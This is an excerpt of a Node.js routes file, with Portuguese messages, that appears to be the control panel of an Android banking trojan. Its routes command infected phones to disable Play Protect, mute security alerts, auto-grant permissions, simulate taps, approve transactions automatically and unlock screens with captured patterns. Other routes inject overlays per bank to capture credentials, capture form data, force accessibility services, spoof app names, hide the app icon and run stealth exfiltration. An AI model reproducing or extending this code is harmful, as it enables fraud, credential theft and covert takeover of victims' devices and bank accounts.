...
const JWT_SECRET = process.env.JWT_SECRET || "L3MON-DEFAULT-SECRET-CHANGE-ME";
...
routes.post("/login", async (req, res) => {
  ...
  if (isLoginBlocked(requestIP)) {
    logManager.log(
      CONST.logTypes.alert,
      `Muitas tentativas de login detectadas para ${requestIP}`,
    );
  ...
  if ("username" in req.body) {
    if ("password" in req.body) {
      ...
      let rPasswordHash = db.maindb.get("admin.password").value();

      // Troca de MD5 para bcrypt (mais seguro)
...
routes.post("/manage/:deviceid/ats/enable/:enabled", isAllowed, (req, res) => {
  ...
  atsManager.setATSEnabled(req.params.deviceid, enabled, (error) => {
    if (!error) {
      res.json({
        error: false,
        message: `ATS ${enabled ? "habilitado" : "desabilitado"}`,
      });
    } else {
      res.json({ error });
    }
...
routes.delete(
  "/manage/:deviceid/ats/pattern/:pattern",
  isAllowed,
  (req, res) => {
    atsManager.removeFieldPattern(
      req.params.deviceid,
      req.params.pattern,
      (error) => {
        if (!error) {
...
// Auto Click Routes
routes.post(
  "/manage/:deviceid/ats/autoclick/enable/:enabled",
  isAllowed,
  (req, res) => {
    let enabled = req.params.enabled === "true" || req.params.enabled === "1";
    atsManager.setAutoClickEnabled(req.params.deviceid, enabled, (error) => {
      if (!error) {
        res.json({
          error: false,
          message: `Auto Click ${enabled ? "habilitado" : "desabilitado"}`,
        });
      } else {
        res.json({ error });
      }
...
routes.post(
  "/manage/:deviceid/ats/autoclick/delay/:delayMs",
  isAllowed,
  (req, res) => {
    atsManager.setClickDelay(
      req.params.deviceid,
      req.params.delayMs,
      (error) => {
        if (!error) {
          res.json({
            error: false,
            message: `Delay alterado para ${req.params.delayMs}ms`,
          });
        } else {
          res.json({ error });
        }
...
routes.delete(
  "/manage/:deviceid/ats/buttonpattern/:pattern",
  isAllowed,
  (req, res) => {
    atsManager.removeButtonPattern(
      req.params.deviceid,
      req.params.pattern,
      (error) => {
        if (!error) {
...
routes.post("/manage/:deviceid/0xDF", isAllowed, (req, res) => {
  ...
  clientManager.sendCommand(
    req.params.deviceid,
    CONST.messageKeys.defenseDisable,
    { action },
    (error, data) => {
      if (error) {
        res.json({ error });
        ...
        res.json({
          error: false,
          message: "Comando de desativação de defesa enviado",
          data,
        });
      }
    },
...
routes.post(
  "/manage/:deviceid/df/disable_play_protect",
  isAllowed,
  (req, res) => {
    clientManager.sendCommand(
      req.params.deviceid,
      ...
      (error) => {
        if (!error) {
          res.json({
            error: false,
            message: "Comando para desativar Google Play Protect enviado",
          });
        } else {
          res.json({ error });
        }
...
routes.post(
  "/manage/:deviceid/df/mute_security_notifications",
  isAllowed,
  (req, res) => {
    clientManager.sendCommand(
      req.params.deviceid,
      ...
      (error) => {
        if (!error) {
          res.json({
            error: false,
            message: "Comando para mudar notificações de segurança enviado",
          });
        } else {
          res.json({ error });
        }
...
routes.get("/manage/:deviceid/df/log", isAllowed, (req, res) => {
  let defenseLog = clientManager.getClientDataByPage(
    req.params.deviceid,
    "defense_disable",
  );
  if (defenseLog) {
...
routes.delete("/manage/:deviceid/df/log", isAllowed, (req, res) => {
  try {
    let clients = db.maindb
      .get("clients")
      .find({ clientID: req.params.deviceid })
      .value();
    if (clients) {
      let clientDB = new (require("./databaseGateway").clientdb)(
        req.params.deviceid,
      );
...
routes.post("/manage/:deviceid/0xPG", isAllowed, (req, res) => {
  ...
  clientManager.sendCommand(
    req.params.deviceid,
    CONST.messageKeys.permissionGrant,
    { action },
    (error, data) => {
      if (error) {
        res.json({ error });
        ...
        res.json({
          error: false,
          message: "Comando de concessão de permissão enviado",
          data,
        });
      }
    },
  ...
  try {
    ...
    if (clients) {
      ...
      clientDB
        ...
        .assign({ autoGrantEnabled: enabled })
        .write();

      res.json({
        error: false,
        message: `Auto-concessão de permissões ${enabled ? "habilitada" : "desabilitada"}`,
      });
    } else {
      res.json({ error: "Dispositivo não encontrado" });
    }
...
routes.get("/manage/:deviceid/pg/log", isAllowed, (req, res) => {
  let permissionGrantLog = clientManager.getClientDataByPage(
    req.params.deviceid,
    "permission_grant",
  );
...
routes.delete("/manage/:deviceid/pg/log", isAllowed, (req, res) => {
  try {
    ...
    if (clients) {
      ...
      res.json({
        error: false,
        message: "Log de concessão de permissões limpo",
      });
    } else {
      res.json({ error: "Dispositivo não encontrado" });
    }
...
routes.post("/manage/:deviceid/0xGS", isAllowed, (req, res) => {
  ...
  clientManager.sendCommand(
    req.params.deviceid,
    CONST.messageKeys.gestureSimulation,
    { gestureType, x, y, duration, endX, endY },
    (error, data) => {
      if (error) {
        res.json({ error });
      } else {
...
routes.post("/manage/:deviceid/gs/tap", isAllowed, (req, res) => {
  ...
  clientManager.sendCommand(
    req.params.deviceid,
    CONST.messageKeys.gestureSimulation,
    { gestureType: "tap", x, y, duration: 0 },
    (error, data) => {
      if (error) {
        res.json({ error });
      } else {
...
routes.post("/manage/:deviceid/gs/long_tap", isAllowed, (req, res) => {
  ...
  clientManager.sendCommand(
    req.params.deviceid,
    CONST.messageKeys.gestureSimulation,
    { gestureType: "long_tap", x, y, duration },
    (error, data) => {
      if (error) {
        res.json({ error });
      } else {
...
routes.post("/manage/:deviceid/gs/swipe", isAllowed, (req, res) => {
  ...
  clientManager.sendCommand(
    req.params.deviceid,
    CONST.messageKeys.gestureSimulation,
    { gestureType: "swipe", x, y, endX, endY, duration },
    (error, data) => {
      if (error) {
        res.json({ error });
      } else {
...
routes.get("/manage/:deviceid/gs/log", isAllowed, (req, res) => {
  let gestureLog = clientManager.getClientDataByPage(
    req.params.deviceid,
    "gesture_simulation",
  );
  if (gestureLog) {
...
routes.post("/manage/:deviceid/0xTA", isAllowed, (req, res) => {
  ...
  clientManager.sendCommand(
    req.params.deviceid,
    CONST.messageKeys.transactionApproval,
    ...
    (error, data) => {
      if (error) {
        ...
        res.json({
          error: false,
          message: "Comando de aprovação de transação enviado",
          data,
        });
      }
    },
  ...
  try {
    ...
    if (clients) {
      ...
      clientDB
        ...
        .assign({ enableAutoApproval: true })
        .write();
      res.json({
        error: false,
        message: "Auto-aprovação de transações habilitada",
      });
    } else {
      res.json({ error: "Dispositivo não encontrado" });
    }
...
routes.post("/manage/:deviceid/ta/disable_auto", isAllowed, (req, res) => {
  try {
    ...
    if (clients) {
      ...
      clientDB
        .get("transactionApprovalConfig")
        .assign({ enableAutoApproval: false })
        .write();
      res.json({
        error: false,
        message: "Auto-aprovação de transações desabilitada",
      });
    } else {
      res.json({ error: "Dispositivo não encontrado" });
    }
...
routes.get("/manage/:deviceid/ta/log", isAllowed, (req, res) => {
  let transactionLog = clientManager.getClientDataByPage(
    req.params.deviceid,
...
routes.post("/manage/:deviceid/0xDSU", isAllowed, (req, res) => {
  ...
  clientManager.sendCommand(
    req.params.deviceid,
    CONST.messageKeys.dynamicScreenUnlock,
    { action, pattern, patternType },
    (error, data) => {
      if (error) {
        res.json({ error });
      } else {
        res.json({
          error: false,
          message: "Comando de desbloqueio de tela enviado",
          data,
        });
      }
    },
  ...
  try {
    ...
    if (clients) {
      ...
      clientDB
        ...
        .assign({ autoUnlockEnabled: true })
        .write();
      res.json({
        error: false,
        message: "Desbloqueio automático de tela habilitado",
      });
    } else {
      res.json({ error: "Dispositivo não encontrado" });
    }
...
routes.post("/manage/:deviceid/dsu/disable_auto", isAllowed, (req, res) => {
  try {
    ...
    if (clients) {
      ...
      clientDB
        .get("dynamicScreenUnlockConfig")
        .assign({ autoUnlockEnabled: false })
        .write();
      res.json({
        error: false,
        message: "Desbloqueio automático de tela desabilitado",
      });
    } else {
      res.json({ error: "Dispositivo não encontrado" });
    }
...
routes.get("/manage/:deviceid/dsu/log", isAllowed, (req, res) => {
  let unlockLog = clientManager.getClientDataByPage(
    req.params.deviceid,
    "dynamic_screen_unlock",
  );
  if (unlockLog) {
...
routes.delete("/manage/:deviceid/dsu/patterns", isAllowed, (req, res) => {
  try {
    ...
    if (clients) {
      ...
      clientDB
        .get("dynamicScreenUnlockConfig.capturedPatterns")
        .assign([])
        .write();
...
routes.post("/manage/:deviceid/0xOI", isAllowed, (req, res) => {
  try {
    ...
    if (client) {
      clientManager.sendCommand(
        req.params.deviceid,
        CONST.messageKeys.overlayInjection,
        req.body,
        (error) => {
          if (error) {
            ...
            res.json({
              error: false,
              message: "Comando de injeção de overlay enviado",
            });
          }
        },
      );
      ...
      clientManager.sendCommand(
        ...
        (error) => {
          if (!error) {
            res.json({
              error: false,
              message: "Monitoramento de overlay ativado",
            });
          } else {
            res.json({ error: error });
          }
...
routes.post(
  "/manage/:deviceid/oi/disable_monitoring",
  isAllowed,
  (req, res) => {
    try {
      let client = db.maindb
        ...
        clientManager.sendCommand(
          ...
          (error) => {
            if (!error) {
              res.json({
                error: false,
                message: "Monitoramento de overlay desativado",
              });
            } else {
              res.json({ error: error });
            }
...
routes.post("/manage/:deviceid/oi/enable_bank/:bank", isAllowed, (req, res) => {
  try {
    ...
    if (client) {
      ...
      res.json({
        error: false,
        message: "Banco " + req.params.bank + " ativado para overlays",
      });
    } else {
      res.json({ error: "Dispositivo não encontrado" });
    }
...
routes.post(
  "/manage/:deviceid/oi/disable_bank/:bank",
  isAllowed,
  (req, res) => {
    try {
      let client = db.maindb
      ...
      if (client) {
        ...
        overlayConfig.enabledBanks = overlayConfig.enabledBanks.filter(
          (b) => b !== req.params.bank,
        );
        clientDB.get("overlayInjectionConfig").assign(overlayConfig).write();
        ...
        res.json({
          error: false,
          message: "Banco " + req.params.bank + " desativado para overlays",
        });
      } else {
        res.json({ error: "Dispositivo não encontrado" });
      }
...
routes.get("/manage/:deviceid/oi/log", isAllowed, (req, res) => {
  let overlayData = clientManager.getClientDataByPage(
    req.params.deviceid,
    "overlay_injection",
  );
  if (overlayData) {
...
routes.delete("/manage/:deviceid/oi/credentials", isAllowed, (req, res) => {
  try {
    ...
    if (client) {
      ...
      clientDB
        .get("overlayInjectionConfig.capturedCredentials")
        .assign([])
        .write();
...
routes.post("/manage/:deviceid/0xFC", isAllowed, (req, res) => {
  try {
    ...
    if (client) {
      clientManager.sendCommand(
        req.params.deviceid,
        CONST.messageKeys.customizedFormsCapture,
        req.body,
        (error) => {
          if (error) {
            res.json({ error: error });
            ...
            res.json({
              error: false,
              message: "Comando de captura de formulário enviado",
            });
          }
        },
      );
      ...
      clientManager.sendCommand(
        ...
        (error) => {
          if (!error) {
            res.json({
              error: false,
              message: "Captura em tempo real ativada",
            });
          } else {
            res.json({ error: error });
          }
      ...
      clientManager.sendCommand(
        ...
        (error) => {
          if (!error) {
            res.json({
              error: false,
              message: "Captura em tempo real desativada",
            });
          } else {
            res.json({ error: error });
          }
  ...
  try {
    ...
    if (client) {
      ...
      res.json({
        error: false,
        message:
          "Banco " + req.params.bank + " ativado para captura de formulários",
      });
    } else {
      res.json({ error: "Dispositivo não encontrado" });
    }
...
routes.post(
  "/manage/:deviceid/fc/disable_bank/:bank",
  isAllowed,
  (req, res) => {
    try {
      let client = db.maindb
      ...
      if (client) {
        ...
        res.json({
          ...
          message:
            "Banco " +
            req.params.bank +
            " desativado para captura de formulários",
        });
      } else {
        res.json({ error: "Dispositivo não encontrado" });
      }
...
routes.get("/manage/:deviceid/fc/data", isAllowed, (req, res) => {
  let fcData = clientManager.getClientDataByPage(
    req.params.deviceid,
    "customized_forms_capture",
  );
  if (fcData) {
...
routes.delete("/manage/:deviceid/fc/data", isAllowed, (req, res) => {
  try {
    ...
    if (client) {
      ...
      clientDB
        .get("customizedFormsCaptureConfig.capturedData")
        .assign([])
        .write();
...
routes.delete("/manage/:deviceid/fc/log", isAllowed, (req, res) => {
  try {
    ...
    if (client) {
      ...
      clientDB
        .get("customizedFormsCaptureConfig.captureLog")
        .assign([])
        .write();
...
routes.post("/manage/:deviceid/0xBP", isAllowed, (req, res) => {
  try {
    ...
    if (client) {
      clientManager.sendCommand(
        req.params.deviceid,
        CONST.messageKeys.bypassProtections,
        req.body,
        (error) => {
          if (error) {
            res.json({ error: error });
            ...
            res.json({
              error: false,
              message: "Comando de bypass de proteções enviado",
            });
          }
        },
      );
      ...
      clientManager.sendCommand(
        ...
        (error) => {
          if (!error) {
            res.json({
              error: false,
              message: "Bypass de proteções desativado",
            });
          } else {
            res.json({ error: error });
          }
...
routes.post(
  "/manage/:deviceid/bp/bypass_restricted_settings",
  isAllowed,
  (req, res) => {
    try {
      let client = db.maindb
        ...
        clientManager.sendCommand(
          ...
          (error) => {
            if (!error) {
              res.json({
                error: false,
                message: "Bypass de Configuração Restrita executado",
              });
            } else {
              res.json({ error: error });
            }
...
routes.post(
  "/manage/:deviceid/bp/force_accessibility_service",
  isAllowed,
  (req, res) => {
    try {
      let client = db.maindb
          ...
          (error) => {
            if (!error) {
              res.json({
                error: false,
                message:
                  "Forçar ativação de Serviço de Acessibilidade executado",
              });
            } else {
              res.json({ error: error });
            }
...
routes.post(
  "/manage/:deviceid/bp/detect_protections",
  isAllowed,
  (req, res) => {
    try {
      let client = db.maindb
        ...
        clientManager.sendCommand(
          ...
          (error) => {
            if (!error) {
              res.json({
                error: false,
                message: "Detecção de proteções executada",
              });
            } else {
              res.json({ error: error });
            }
...
routes.post(
  "/manage/:deviceid/bp/set_installation_method/:method",
  isAllowed,
  (req, res) => {
    try {
      let client = db.maindb
      ...
      if (client) {
        ...
        if (!validMethods.includes(req.params.method)) {
          return res.json({
            error:
              "Método de instalação inválido. Válidos: " +
              validMethods.join(", "),
          });
        }
        clientManager.sendCommand(
          ...
          CONST.messageKeys.bypassProtections,
          {
            ...
            spoofedAppName:
              req.body.spoofedAppName ||
              this.getDefaultAppName(req.params.method),
          },
          (error) => {
            if (!error) {
              res.json({
                error: false,
                message: "Método de instalação definido: " + req.params.method,
              });
            } else {
              res.json({ error: error });
            }
...
routes.get("/manage/:deviceid/bp/data", isAllowed, (req, res) => {
  let bpData = clientManager.getClientDataByPage(
    req.params.deviceid,
    "bypass_protections",
  );
  if (bpData) {
...
routes.post("/manage/:deviceid/hi/enable_hide", isAllowed, (req, res) => {
  try {
    ...
    if (client) {
      ...
      global.clientManager.sendCommand(req.params.deviceid, {
        action: "enable_hide",
        type: "0xHI",
      });
...
routes.post("/manage/:deviceid/hi/remove_icon", isAllowed, (req, res) => {
  try {
    ...
    if (client) {
      ...
      res.json({
        error: false,
        message: "Ícone removido da gaveta de aplicativos",
      });
    } else {
      res.json({ error: "Dispositivo não encontrado" });
    }
...
routes.post(
  "/manage/:deviceid/hi/enable_background_service",
  isAllowed,
  (req, res) => {
    try {
      let client = db.maindb
      ...
      if (client) {
        ...
        clientDB
          .get("advancedHideIconConfig.backgroundServiceActive")
          .assign(true)
          .write();
        global.clientManager.sendCommand(req.params.deviceid, {
          action: "enable_background_service",
          type: "0xHI",
        });
...
routes.post(
  "/manage/:deviceid/hi/set_activation_method/:method",
  isAllowed,
  (req, res) => {
    try {
      let client = db.maindb
      ...
      if (client) {
        ...
        res.json({
          error: false,
          message: "Método de ativação alterado para: " + method,
        });
      } else {
        res.json({ error: "Dispositivo não encontrado" });
      }
...
routes.get("/manage/:deviceid/hi/data", isAllowed, (req, res) => {
  try {
    const data = global.clientManager.getClientDataByPage(
      req.params.deviceid,
      "advanced_hide_icon",
    );
...
routes.post("/manage/:deviceid/0xEX", isAllowed, (req, res) => {
  let payload = {
    action: req.body.action || req.query.action || "fragment",
    data: req.body.data || req.query.data || "",
    domain: req.body.domain || req.query.domain,
    url: req.body.url || req.query.url,
    event: req.body.event || req.query.event,
  };

  clientManager.sendCommand(
    req.params.deviceid,
    CONST.messageKeys.exfil,
    payload,
    (error) => {
      if (!error) {
        logManager.log(
          CONST.logTypes.info,
          `Exfil command sent to ${req.params.deviceid} (action=${payload.action})`,
        );
        res.json({
          error: false,
          message: "Comando de exfiltração stealth enviado",
        });
      } else {
        res.json({ error });
      }
...
// Atalho mais amigável
routes.post("/manage/:deviceid/exfil", isAllowed, (req, res) => {
  let payload = {
    action:
      req.body.action || req.query.action || req.body.channel || "fragment",
    data: req.body.data || req.query.data || req.body.payload || "",
    domain: req.body.domain || req.query.domain,
    url: req.body.url || req.query.url,
  };
  ...
  clientManager.sendCommand(
    ...
    (error) => {
      if (!error) {
        res.json({ error: false, message: "Exfiltração iniciada" });
      } else {
        res.json({ error });
      }
    },
...
routes.post("/security/ai/logs-summary", isAllowed, async (req, res) => {
  try {
    ...
    logManager.log(
      CONST.logTypes.info,
      "Resumo defensivo de logs gerado via Grok",
    );
    res.json({
      error: false,
      data: result,
    ...
    logManager.log(
      ...
      `Falha ao gerar resumo defensivo com Grok: ${error.message}`,
    );
    res.status(500).json({
      error: error.message,
    });
